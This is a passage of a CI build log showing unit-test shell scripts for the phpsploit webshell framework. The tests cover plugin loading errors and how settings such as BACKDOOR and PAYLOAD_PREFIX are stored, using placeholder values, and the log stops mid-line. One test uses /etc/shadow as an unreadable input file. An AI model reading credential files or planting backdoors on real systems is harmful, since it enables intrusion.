\u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# reload-plugins should fail, because there is at least an error\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'corectl reload-plugins' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2msed -i -e \"1,2d\" $TMPFILE # remove 2 first lines (unwanted)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -A1 \"^\\[#\\] Couldn't load category: '.*/plugins/invalid.category'$\" $TMPFILE > $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q  \"^\\[#\\]     Folder name doesn.*t match .*\" $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -A1 \"^\\[#\\] Couldn't load plugin: '.*/plugins/valid_category-name/invalid-name.notloaded'$\" $TMPFILE > $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q  \"^\\[#\\]     Folder name doesn.*t match .*\" $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -A1 \"^\\[#\\] Couldn't load plugin: '.*/plugins/valid_category-name/is-empty'$\" $TMPFILE > $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q  \"^\\[#\\]     File plugin.py is empty\" $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -A1 \"^\\[#\\] Couldn't compile plugin: '.*/plugins/valid_category-name/cannot-compile'$\" $TMPFILE > $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q  \"^\\[#\\] Traceback (most recent call last):$\" $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -A1 \"^\\[#\\] Couldn't load plugin: '.*/plugins/valid_category-name/plugin-py_not-readable'$\" $TMPFILE > $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q  \"^\\[#\\]     File error on plugin.py: \" $TMPFILE-out || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m $n_plugs_plus2 plugins correctly loaded$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[\\#\\] 5 errors encountered while loading plugins\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE \"corectl reload-plugins\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/core.plugins/RUN.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=4s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/linebuf.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/core/linebuf.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.2emxvPlZuD\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Test `linebuf` module (linebuf.py)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# *LineBuffer classes are used as base class for\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit configuration settings.\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Test Setup\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# set EDITOR to a custom script that copies buffer into $OUT file:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mIN=\"$TMPFILE-EDITOR-IN\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mOUT=\"$TMPFILE-EDITOR-OUT\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $TMPFILE-EDITOR << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2mIN=\"$IN\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mOUT=\"$OUT\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mif [ -f \"\\$IN\" ]; then\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    cat \"\\$IN\" > \"\\$1\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    rm -f \"\\$IN\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfi\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat \"\\$1\" > \"\\$OUT\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchmod +x $TMPFILE-EDITOR\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set EDITOR \"$TMPFILE-EDITOR\" > /dev/null || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# $FILE_5LINES = readable file with 5 lines (and 3 valid lines)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mFILE_5LINES=$TMPFILE-FILE_5LINES\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $FILE_5LINES << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline1 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# comment (and then, emtpy line)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline4 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline5 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# $FILE_EMPTY = readable file with no content\u001b[m\n[Unit Tests/build]   | \u001b[33;2mFILE_EMPTY=$TMPFILE-FILE_EMPTY\u001b[m\n[Unit Tests/build]   | \u001b[33;2m> $FILE_EMPTY\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# $FILE_INVALID = non-readable file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mFILE_INVALID=\"/etc/shadow\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### MultiLineBuffer Test\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### \u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Using `SAVEPATH` settings to test MultiLineBuffer:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###   - *usable-value condition: `os.path.isdir(value)`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###   - checking current *usable-value: ./phpsploit -e session | grep 'phpsploit.session'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### assert `SAVEPATH` is a MultiLineBuffer\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help set SAVEPATH > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'is a MultiLineBuffer'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# display SAVEPATH value through another phpsploit command that uses it\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfunction show_val_SAVEPATH () {\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe session | grep -oP '(?<=\\()[a-z/]+(?=phpsploit.session\\)$)'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m}\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test SAVEPATH with valid directory\u001b[m\n[Unit Tests/build]   | \u001b[33;2mmkdir \"$TMPFILE-valid-dir\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho \"$TMPFILE-valid-dir\" > $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set SAVEPATH + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# buffer should contain the new value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set SAVEPATH + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $OUT $TMPFILE-valid-dir\u001b[m\n[Unit Tests/build]   | \u001b[33;2mshow_val_SAVEPATH > $TMPFILE && assert_contains $TMPFILE $TMPFILE-valid-dir\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test SAVEPATH with INVALID directory (old value should remain)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $IN << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$TMPFILE-invalid-dir\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set SAVEPATH + > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# buffer should STILL contain old value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set SAVEPATH + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $OUT $TMPFILE-valid-dir\u001b[m\n[Unit Tests/build]   | \u001b[33;2mshow_val_SAVEPATH > $TMPFILE && assert_contains $TMPFILE $TMPFILE-valid-dir\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Using `PAYLOAD_PREFIX` setting to test MultiLineBuffer:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###   - *usable-value condition: **NO-CONDITION**\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### set PAYLOAD_PREFIX to a 8 lines buffer (with blank lines & comments)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $IN << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline1\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this is a comment, and next, 2 blank lines\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline5\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline6\u001b[m\n[Unit Tests/build]   | \u001b[33;2mline7\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# another comment\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mperl -pe 'chomp if eof' $IN > $IN-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# buffer should be exactly as defined in $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $OUT $IN-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm -f $IN-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# PAYLOAD_PREFIX repr should say '8 lines':\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE '<MultiLine@.* (8 lines)>$'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### set PAYLOAD_PREFIX to a SINGLE LINE BUFFER\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho 'SingleLineValue' > $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# PAYLOAD_PREFIX repr should simply show the value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'SingleLineValue'\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mMultiLine\u001b[m\n[Unit Tests/build]   | \u001b[33;2m1 line\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### set PAYLOAD_PREFIX to an EMPTY BUFFER\u001b[m\n[Unit Tests/build]   | \u001b[33;2m> $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# PAYLOAD_PREFIX repr should say '0 lines':\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE '<MultiLine@d41d8cd98f00b204e9800998ecf8427e (0 lines)>'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test 'set <SETTING> + <VALUE>' syntax\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# bind to FILE_5LINES, check buffer is updated\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + file://$FILE_5LINES > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@$FILE_5LINES (5 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# add a line, unbinding the buffer from file:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + line6 > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@[a-f0-9]\\{32\\} (6 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# bind if to FILE_INVALID, check buffer is kept\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + file://$FILE_INVALID > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@$FILE_INVALID (6 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# re-bind to FILE_5LINES, check buffer is updated\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + file://$FILE_5LINES > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@$FILE_5LINES (5 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# re-bind to FILE_EMPTY, check buffer is kept\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + file://$FILE_EMPTY > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@$FILE_EMPTY (5 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# add a line, unbinding the buffer from file:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX + line6 > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@[a-f0-9]\\{32\\} (6 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# reset to default value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX %%DEFAULT%% > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@[a-f0-9]\\{32\\} (16 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# FAIL to reset to FILE_EMPTY or FILE_INVALID\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX file://FILE_EMPTY > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX file://FILE_INVALID > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PAYLOAD_PREFIX > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"<MultiLine@[a-f0-9]\\{32\\} (16 lines)>$\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### RandLineBuffer Test\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### \u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### Using `BACKDOOR` settings to test RandLineBuffer:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###   - *usable-value condition: `'%%PASSKEY' in value`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###   - checking current *usable-value: `./phpsploit -e 'exploit --get-backdoor'`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# assert `BACKDOOR` is a RandLineBuffer\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe help set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'is a RandLineBuffer'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# display BACKDOOR value through another phpsploit command that uses it\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfunction show_val_BACKDOOR () {\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe exploit --get-backdoor\u001b[m\n[Unit Tests/build]   | \u001b[33;2m}\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test BACKDOOR with valid value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho %%PASSKEY%%ValidValue > $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# buffer should contain the new value\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $OUT %%PASSKEY%%ValidValue\u001b[m\n[Unit Tests/build]   | \u001b[33;2mshow_val_BACKDOOR > $TMPFILE && assert_contains $TMPFILE PHPSPL01TValidValue\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### test BACKDOOR with INVALID value (old value should remain)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho /invalid > $IN\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# buffer should STILL contain old value\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $OUT %%PASSKEY%%ValidValue\u001b[m\n[Unit Tests/build]   | \u001b[33;2mshow_val_BACKDOOR > $TMPFILE && assert_contains $TMPFILE PHPSPL01TValidValue\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### set BACKDOOR to a 4 choices buffer (with blank lines & comments)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mcat > $IN << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice1 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# this is a comment, and next, 2 blank lines\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice2 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice3 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice4 %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# another comment %%PASSKEY%%\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mperl -pe 'chomp if eof' $IN > $IN-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# shoud not fail\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR + > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# buffer should be exactly as defined\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $OUT $IN-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm -f $IN-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# BACKDOOR repr should say '4 choices':\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BACKDOOR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE '<RandLine@.* (4 choices)>$'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# try to show_val 50 times, and make sure all 4 choices where picked as *usable-value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mbuf=\"\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor i in {1..50}; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    buf=\"$buf exploit --get-backdoor;\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe \"$buf\" | grep '^<?php' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice1\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice2\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice3\u001b[m\n[Unit Tests/build]   | \u001b[33;2mchoice4\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# assert not other choice has been picked as *usable-value\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -qv 'choice[1-4] PHPSPL01T' $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### set BACKDOOR to a SINGLE LINE BUFFER\u001b[m\n[Unit Tests/build]   | \u001b[33;2mecho 'SingleValue%%PASSKEY%%' > $IN\u001b[m\n[Unit 